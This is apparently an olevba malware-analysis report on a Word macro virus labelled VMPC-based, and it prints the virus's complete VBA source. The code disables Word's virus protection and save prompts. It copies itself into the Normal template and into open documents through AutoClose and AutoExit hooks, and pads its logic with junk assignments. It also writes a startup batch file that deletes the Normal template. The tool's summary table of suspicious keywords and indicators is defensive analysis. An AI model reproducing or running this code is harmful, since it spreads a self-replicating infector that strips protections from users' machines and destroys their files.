olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-98e157a5feaa6a43efc03f38e0667fd47fb8a0da
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-98e157a5feaa6a43efc03f38e0667fd47fb8a0da - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO IraArmagH.bas 
in file: Virus.MSWord.VMPC-based-98e157a5feaa6a43efc03f38e0667fd47fb8a0da - OLE stream: 'Macros/VBA/iraarmagh'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub IraArmagH()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Daddy's got a big o'l bag-a-chicken"
    'Poppy ID : 608741231964
    
    
On Error Resume Next
k10325 = m3303 & e4187
k16131 = m11352 & e2909
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
f12227 = u14295 & c2377 & k6448 & m14295
k9294 = m6009 & e10662
ActiveDocument.ReadOnlyRecommended = False
f6382 = u16661 & c7033 & k4920 & m16661
q412360879 = 0
f14835 = u10450 & c15723 & k16476 & m10450
f10609 = u18555 & c11378 & k10698 & m18555
Set Unit187608741234 = MacroContainer
 f7997$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f1240 = u3878 & c10025 & k2169 & m3878
b17606087 = GetAttr(NormalTemplate.FullName)
If b17606087 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f7997$)
If b17606087 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f7997$)
f14656 = u7903 & c13872 & Int(Rnd * 5520)
If b17606087 = vbReadOnly Then GoTo fuckoff
f2633 = u8230 & c7625 & Int(Rnd * 297)
If b17606087 = vbReadOnly + vbArchive Then GoTo fuckoff
f8644 = u13066 & c15748 & k8978 & m13066
If Unit187608741234 = NormalTemplate Then q412360879 = 1
If q412360879 = 1 Then nmn41232 = NormalTemplate.FullName Else nmn41232 = ActiveDocument.FullName
If q412360879 = 1 Then cde608713 = ActiveDocument.FullName Else cde608713 = NormalTemplate.FullName
Application.OrganizerCopy Source:=nmn41232, Destination:=cde608713, Name:="IraArmagH", Object:=wdOrganizerObjectProjectItems
f9858 = u14870 & c11497 & Int(Rnd * 5017)
If q412360879 = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
k3573 = m16425 & e9722
If q412360879 = 0 Then
k13916 = m5524 & e10897
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
k13544 = m10270 & e3796
f15631 = u12975 & c7151 & Int(Rnd * 2798)
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
k11165 = m12739 & e11498
k9638 = m15106 & e11837
    MsgBox "IRA-Armagh", vbInformation
End Sub
Sub AutoExit()
    On Error Resume Next
f12870 = u14960 & c10094 & k4757 & m14960
    Call IraArmagH
f16786 = u10597 & c12282 & Int(Rnd * 7783)
End Sub
Sub AutoClose()
    On Error Resume Next
    Call IraArmagH
k17974 = m11927 & e17816
End Sub
Sub ToolsMacro()
    On Error Resume Next
f12465 = u11025 & c4845 & Int(Rnd * 1260)
End Sub
Sub FileTemplates()
    On Error Resume Next
f15239 = u14385 & c10973 & Int(Rnd * 9118)
f7656 = u2650 & c13398 & k14699 & m2650
End Sub
Sub ViewVBCode()
    On Error Resume Next
f8240 = u9131 & c10499 & Int(Rnd * 9040)
f18405 = u6335 & c13279 & Int(Rnd * 9629)
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f16036 = u6910 & c2401 & k8950 & m6910
k7794 = m14531 & e6928
n$ = NormalTemplate
k10354 = m9458 & e10114
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
f14417 = u11172 & c11402 & k13199 & m11172
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f8001 = u12401 & c18030 & k10669 & m12401
f11013 = u12491 & c6628 & Int(Rnd * 8451)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

